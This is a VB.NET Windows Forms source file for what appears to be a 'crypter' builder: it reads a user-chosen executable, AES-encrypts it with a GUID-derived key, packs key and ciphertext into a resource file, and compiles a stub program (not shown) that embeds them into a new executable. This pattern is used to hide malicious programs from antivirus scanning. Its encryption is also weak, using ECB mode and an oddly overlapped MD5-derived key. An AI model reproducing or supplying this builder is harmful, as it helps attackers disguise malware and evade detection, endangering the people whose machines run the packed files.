Imports System.CodeDom
Imports System.Drawing.Imaging

Public Class Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim filebytes As Byte() = Nothing
        Using o As New OpenFileDialog
            o.Filter = "Portable Executable |*.exe"
            If o.ShowDialog = vbOK Then
                filebytes = IO.File.ReadAllBytes(o.FileName)
            Else
                MsgBox("You need to select a file", MsgBoxStyle.Critical)
                Exit Sub
            End If
        End Using

        Dim Key As String = Guid.NewGuid.ToString()
        Dim KeyBytes As Byte() = System.Text.Encoding.Default.GetBytes(Key)


        filebytes = AES_Encrypt(filebytes, KeyBytes) 'Encrypt the FileBytes

        Dim newFilebytes As String = System.Text.Encoding.Default.GetString(filebytes) 'Convert the Bytes in String

        Dim RP As String = Application.StartupPath & "\2029.resources"
        Using R As New Resources.ResourceWriter(RP)
            R.AddResource("1", New Object() {Key, newFilebytes}) 'Creating a resource file with the key + the file in string stored in a Object array .
            R.Generate()
        End Using

        Using s As New SaveFileDialog
            s.Filter = "Portable Executable |*.exe"
            If s.ShowDialog = vbOK Then
                compile_Stub(My.Resources.Source, s.FileName, RP, True, Nothing)
            End If
        End Using
        IO.File.Delete(RP)
        MsgBox("Done !", MsgBoxStyle.Information)
    End Sub
    Public Function AES_Encrypt(ByVal Data As Byte(), ByVal Key As Byte()) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim hash(31) As Byte
        Dim temp As Byte() = Hash_AES.ComputeHash(Key)
        Array.Copy(temp, 0, hash, 0, 16)
        Array.Copy(temp, 0, hash, 15, 16)
        AES.Key = hash
        AES.Mode = Security.Cryptography.CipherMode.ECB
        Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
        Return DESEncrypter.TransformFinalBlock(Data, 0, Data.Length)
    End Function

    Public Function AES_Decrypt(ByVal Data As Byte(), ByVal Key As Byte()) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim hash(31) As Byte
        Dim temp As Byte() = Hash_AES.ComputeHash(Key)
        Array.Copy(temp, 0, hash, 0, 16)
        Array.Copy(temp, 0, hash, 15, 16)
        AES.Key = hash
        AES.Mode = Security.Cryptography.CipherMode.ECB
        Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
        Return DESDecrypter.TransformFinalBlock(Data, 0, Data.Length)
    End Function

    Public Shared Function compile_Stub(ByVal input As String, ByVal output As String, ByVal resources As String, ByVal showError As Boolean, Optional ByVal icon_Path As String = Nothing) As Boolean

        Dim provider_Args As New Dictionary(Of String, String)()
        provider_Args.Add("CompilerVersion", "v2.0")

        Dim provider As New Microsoft.VisualBasic.VBCodeProvider(provider_Args)
        Dim c_Param As New Compiler.CompilerParameters
        Dim c_Args As String = " /target:winexe /platform:x86 /optimize "

        If Not icon_Path = Nothing Then
            c_Args = c_Args & " /win32icon:" & icon_Path
        Else
            'c_Args = c_Args & " /win32icon:" & generateicon()
        End If

        c_Param.GenerateExecutable = True
        c_Param.OutputAssembly = output
        c_Param.EmbeddedResources.Add(resources)
        c_Param.CompilerOptions = c_Args
        c_Param.IncludeDebugInformation = False
        c_Param.ReferencedAssemblies.AddRange({"System.Dll", "System.Windows.Forms.Dll"})

        Dim c_Result As Compiler.CompilerResults = provider.CompileAssemblyFromSource(c_Param, input)
        If c_Result.Errors.Count = 0 Then
            Return True
        Else
            If showError Then
                For Each _Error As Compiler.CompilerError In c_Result.Errors
                    MessageBox.Show(_Error.ToString)
                Next
                Return False
            End If
            Return False
        End If

    End Function

End Class
